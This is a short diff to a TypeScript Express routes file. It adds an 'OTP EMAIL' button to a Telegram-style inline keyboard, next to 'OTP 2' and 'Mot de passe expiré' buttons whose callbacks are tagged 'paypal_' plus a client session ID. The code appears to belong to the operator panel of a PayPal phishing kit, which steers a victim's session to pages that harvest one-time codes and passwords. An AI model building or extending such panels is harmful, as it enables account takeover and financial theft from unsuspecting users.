@@ -452,6 +452,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             { text: "🔑 OTP 2", callback_data: `paypal_otp2_${clientInfo.sessionId}` }
           ],
           [
+            { text: "📧 OTP EMAIL", callback_data: `paypal_otp_email_${clientInfo.sessionId}` },
             { text: "🔒 Mot de passe expiré", callback_data: `paypal_password_${clientInfo.sessionId}` }
           ],
           [
